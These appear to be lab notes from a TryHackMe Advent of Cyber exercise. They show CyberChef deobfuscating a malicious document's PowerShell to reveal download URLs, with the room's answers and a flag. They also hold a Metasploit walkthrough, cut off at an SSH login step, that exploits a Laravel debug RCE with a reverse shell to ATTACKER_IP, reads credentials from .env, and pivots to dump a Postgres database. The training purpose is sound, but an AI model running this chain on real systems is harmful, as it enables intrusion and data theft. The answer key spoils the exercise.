5.  Click on bake to run the functions added in Panel 3 in order. We can select AutoBake to automatically run the recipes as they are added.
Using CyberChef for mal doc analysis
Let's utilize the functions, also known as recipes, from the left panel in CyberChef to analyze the malicious doc. Each step is explained below:
**1) Add the File to CyberChef**
Drag the invoice.doc file from the desktop to panel 1 as input, as shown below. Alternatively, the user can add the`Division_of_labour-Load_share_plan.doc` file by Open file as input icon in the top-right area of the CyberChef page.
**2) Extract strings**
Strings are ASCII and Unicode-printable sequences of characters within a file. We are interested in the strings embedded in the file that could lead us to suspicious domains. Use the `strings` function from the left panel to extract the strings by dragging it to panel 3 and selecting **All printable chars** as shown below:
If we examine the result, we can see some random strings of different lengths and some obfuscated strings. Narrow down the search to show the strings with a larger length. Keep increasing the minimum length until you remove all the noise and are only left with the meaningful string, as shown below:
**3) Remove Pattern
**
Attackers often add random characters to obfuscate the actual value. If we examine, we can find some repeated characters `[ _ ]`. As these characters are common in different places, we can use regex **(regular expressions)** within the `Find / Replace` function to find and remove these repeated characters.
To use regex, we will put characters within the square brackets `[ ]` and use backslash `\` to escape characters. In this case, the final regex will be`[**\[\]\n_**]` where `\n` represents **the Line feed**, as shown below:
It's evident from the result that we are dealing with a PowerShell script, and it is using base64 Encoded string to hide the actual code.
**4) Drop Bytes**
To get access to the base64 string, we need to remove the extra bytes from the top. Let's use the `Drop bytes` function and keep increasing the number until the top bytes are removed.
**5) Decode base64**
Now we are only left with the base64 text. We will use the `From base64` function to decode this string, as shown below:
**6) Decode UTF-16
**
The base64 decoded result clearly indicates a PowerShell script which seems like an interesting finding. In general, the PowerShell scripts use the `Unicode UTF-16LE` encoding by default. We will be using the `Decode text` function to decode the result into UTF-16E, as shown below:
**7) Find and Remove Common Patterns**
Forensic McBlue observes various repeated characters  ``' ( ) + ' ` "`` within the output, which makes the result a bit messy. Let's use regex in the `Find/Replace` function again to remove these characters, as shown below. The final regex will be ``['()+'"`]``.
**8) Find and Replace
**
If we examine the output, we will find various domains and some weird letters `]b2H_` before each domain reference. A replace function is also found below that seems to replace this `]b2H_` with `http`.
Let's use the `find / Replace` function to replace `]b2H_` with `http` as shown below:
**9) Extract URLs**
The result clearly shows some domains, which is what we expected to find. We will use the `Extract URLs` function to extract the URLs from the result, as shown below:
**10) Split URLs with @**
The result shows that each domain is followed by the `@`character, which can be removed using the split function as shown below:
**11) Defang URL**
Great - We have finally extracted the URLs from the malicious document; it looks like the document was indeed malicious and was downloading a malicious program from a suspicious domain.
Before passing these domains to the SOC team for deep malware analysis, it is recommended to defang them to avoid accidental clicks. Defanging the URLs makes them unclickable. We will use `Defang URL` to do the task, as shown below:
**Great work!**
It's time to share the URLs and the malicious document with the Malware Analysts.
Answer the questions below
What is the version of CyberChef found in the attached VM?
![[Pasted image 20221218000746.png]]
*9.49.0*
How many recipes were used to extract URLs from the malicious doc?
![[Pasted image 20221218001004.png]]
![[Pasted image 20221218001057.png]]
![[Pasted image 20221218001133.png]]
![[Pasted image 20221218001209.png]]
![[Pasted image 20221218001246.png]]
![[Pasted image 20221218001430.png]]
![[Pasted image 20221218002143.png]]
![[Pasted image 20221218002208.png]]
![[Pasted image 20221218002233.png]]
![[Pasted image 20221218002254.png]]
*10*
We found a URL that was downloading a suspicious file; what is the name of that malware?
Provide a non-defanged output.
*mysterygift.exe*
What is the last defanged URL of the bandityeti domain found in the last step?
*hxxps[://]cdn[.]bandityeti[.]THM/files/index/*
What is the ticket found in one of the domains? (Format: Domain/<GOLDEN_FLAG>)
*THM_MYSTERY_FLAG*
If you liked the investigation today, you might also enjoy the [Security Information and Event Management](https://tryhackme.com/module/security-information-event-management) module!
### [Day 8] Smart Contracts Last Christmas I gave you my ETH
The Story
Check out MWRSecurity's video walkthrough for Day 8 [here](https://www.youtube.com/watch?v=4Oydt3fNlgQ)!
After it was discovered that Best Festival Company was now on the blockchain and attempting to mint their cryptocurrency, they were quickly compromised. Best Festival Company lost all its currency in the exchange because of the attack. It is up to you as a red team operator to discover how the attacker exploited the contract and attempt to recreate the attack against the same target contract.

## Exploitation
```shell-session
curl --proxy socks4a://localhost:9050 http://MACHINE_IP
```
If the tool does not natively support an option for using a socks proxy, ProxyChains can intercept the tool’s request to open new network connections and route the request through a socks proxy instead. For instance, an example with Nmap:
Shell commands
```shell-session
proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 MACHINE_IP
```
### Challenge Walkthrough
After deploying the attached VM, run Nmap against the target:
Shell commands
```shell-session
nmap -T4 -A -Pn MACHINE_IP
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-13 10:30 EDT
Nmap scan report for 10.10.173.133
Host is up (0.031s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Curabitur aliquet, libero id suscipit semper
|_http-server-header: Apache/2.4.54 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
After loading the web application in our browser at http://MACHINE_IP:80 (use Firefox on the Kali web-Machine) and inspecting the Network tab, we can see that the server responds with an HTTP Set-Cookie header indicating that the server is running Laravel - a common web application development framework:
The application may be vulnerable to a remote code execution exploit which impacts Laravel applications using debug mode with Laravel versions before 8.4.2, which use ignite as a developer dependency.
We can use Metasploit to verify if the application is vulnerable to this exploit.
Note: be sure to set the HttpClientTimeout=20, or the check may fail. In extreme situations where your connection is really slow/unstable, you may need a value higher than 20 seconds.
Shell commands
```shell-session
$ msfconsole
```
```shell-session
msf6 > use multi/php/ignition_laravel_debug_rce
[*] Using configured payload cmd/unix/reverse_bash
```
```shell-session
msf6 exploit(multi/php/ignition_laravel_debug_rce) > check rhost=MACHINE_IP HttpClientTimeout=20

[*] Checking component version to 10.10.143.36:80
[*] 10.10.143.36:80 - The target appears to be vulnerable.
```
**Note: When using TryHackMe's Kali Web-Machine - you should use eth0 as the LHOST value (ATTACKER_IP), and not the VPN IP shown in the Kali Machine at the top-right corner (which is tun0).**
To find out what IP address you need to use, you can open up a new terminal and enter `ip addr`. The IP address you need will start with _10.x.x.x_. Remember, you will either need to use eth0 or tun0, depending on whether or not you are using the TryHackMe Kali Web-Machine.
Using ip addr to list the interfaces corresponding IP address in Kali
```shell-session
kali@kali:~$ ip addr
2: eth0:  mtu 9001 qdisc mq state UP group default qlen 1000
    link/ether 02:cd:41:12:70:5d brd ff:ff:ff:ff:ff:ff
    inet 10.9.11.45/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2973sec preferred_lft 2973sec
    inet6 fe80::cd:41ff:fe12:705d/64 scope link
       valid_lft forever preferred_lft forever
```
Now that we’ve confirmed the vulnerability, let’s run the module to open a new session:
Metasploit Console Commands
```shell-session
msf6 exploit(multi/php/ignition_laravel_debug_rce) > run rhost=MACHINE_IP lhost=ATTACKER_IP HttpClientTimeout=20

[*] Started reverse TCP handler on 10.9.0.185:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking component version to 10.10.143.36:80
[+] The target appears to be vulnerable.
[*] Command shell session 1 opened (10.9.0.185:4444 -> 10.10.143.36:53986) at 2022-09-13 11:55:50 -0400
whoami

www-data
```
The opened shell will be a basic `cmd/unix/reverse_bash` shell. We can see this by running the background command and viewing the currently active sessions:
Metasploit Console Commands
```shell-session
background

Background session 1? [y/N]  y
```
```shell-session
msf6 exploit(multi/php/ignition_laravel_debug_rce) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               10.9.0.185:4444 -> 10.10.143.36:53986 (10.10.143.36)
```
If you are currently in a session - you can run the `background` command to go back to the top-level Metasploit prompt. To upgrade the most recently opened session to Meterpreter, use the `sessions -u -1` command. Metasploit will now show two sessions opened - one for the original shell session and another for the new Meterpreter session:
Metasploit Console Commands
```shell-session
msf6 exploit(multi/php/ignition_laravel_debug_rce) > sessions -u -1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [-1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.9.0.185:4433
[*] Sending stage (989032 bytes) to 10.10.143.36
[*] Meterpreter session 2 opened (10.9.0.185:4433 -> 10.10.143.36:51132) at 2022-09-13 12:02:51 -0400
[*] Command stager progress: 100.00% (773/773 bytes)
```
```shell-session
msf6 exploit(multi/php/ignition_laravel_debug_rce) > sessions

Active sessions
===============

  Id  Name  Type                   Information               Connection
  --  ----  ----                   -----------               ----------
  1         shell cmd/unix                                   10.9.0.185:4444 -> 10.10.143.36:53986 (10.10.143.36)
  2         meterpreter x86/linux  www-data @ 172.28.101.50  10.9.0.185:4433 -> 10.10.143.36:51132 (172.28.101.50)
```
After interacting with the Meterpreter session with `sessions -i -1` and exploring the application, we can see there are database credentials available:
Meterpreter Commands
```shell-session
meterpreter > cat /var/www/.env
```
```shell-session
# ...

DB_CONNECTION=pgsql
DB_HOST=webservice_database
DB_PORT=5432
DB_DATABASE=....
DB_USERNAME=...
DB_PASSWORD=...
```
We can use Meterpreter to resolve this remote hostname to an IP address that we can use for attacking purposes:
Meterpreter Commands
```shell-session
meterpreter > resolve webservice_database

Host resolutions
================

    Hostname             IP Address
    --------             ----------
    webservice_database  172.28.101.51
```
As this is an internal IP address, it won’t be possible to send traffic to it directly. We can instead leverage the network pivoting support within msfconsole to reach the inaccessible host. To configure the global routing table in msfconsole, ensure you have run the `background` command from within a Meterpreter session:
Metasploit Console Commands
```shell-session
# The discovered webserice_database IP will be routed to through the Meterpreter session
```
```shell-session
msf6 exploit(multi/php/ignition_laravel_debug_rce) > route add 172.28.101.51/32 -1
[*] Route added
```
We can also see, due to the presence of the `/.dockerenv` file, that we are in a docker container. By default, Docker chooses a hard-coded IP to represent the host machine. We will also add that to our routing table for later scanning:
Metasploit Console Commands
```shell-session
msf6 exploit(multi/php/ignition_laravel_debug_rce) > route add 172.17.0.1/32 -1
[*] Route added
```
We can print the routing table to verify the configuration settings:
Metasploit Console Commands
```shell-session
msf6 exploit(multi/php/ignition_laravel_debug_rce) > route print

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.17.0.1         255.255.255.255    Session 3
   172.28.101.51      255.255.255.255    Session 3

[*] There are currently no IPv6 routes defined.
```
With the previously discovered database credentials and the routing table configured, we can start to run Metasploit modules that target Postgres. Starting with a schema dump, followed by running queries to select information out of the database:
Metasploit Console Commands
```shell-session
# Dump the schema
use auxiliary/scanner/postgres/postgres_schemadump
run postgres://postgres:postgres@172.28.101.51/postgres
```
```shell-session
# Select information from a specific table
use auxiliary/admin/postgres/postgres_sql
run postgres://postgres:postgres@172.28.101.51/postgres sql='select * from users'
```
To further pivot through the private network, we can create a socks proxy within Metasploit:
Metasploit Console Commands
```shell-session
msf6 > use auxiliary/server/socks_proxy
```
```shell-session
msf6 auxiliary(server/socks_proxy) > run srvhost=127.0.0.1 srvport=9050 version=4a
[*] Auxiliary module running as background job 1.

[*] Starting the SOCKS proxy server
```
This will expose a port on the attacker machine that can be used to run other network tools through, such as `curl` or `proxychains`
Shell commands
```shell-session
# From the attacker’s host machine, we can use curl with the internal Docker IP to show that the web application is running, and the socks proxy works
```
```shell-session
$ curl --proxy socks4a://localhost:9050 http://172.17.0.1 -v

… etc …
```
```shell-session
# From the attacker’s host machine, we can use ProxyChains to scan the compromised host machine for common ports
```
```shell-session
$ proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 172.17.0.1
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-24 08:48 EDT
Nmap scan report for 172.17.0.1
Host is up (0.069s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
443/tcp  closed https
5432/tcp closed postgresql

Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
```
With the host scanned, we can see that port 22 is open on the host machine. It also is possible that Santa has re-used his password, and it’s possible to SSH into the host machine from the Docker container to grab the flag:
Metasploit Console Commands
```shell-session
msf6 auxiliary(server/socks_proxy) > use auxiliary/scanner/ssh/ssh_login
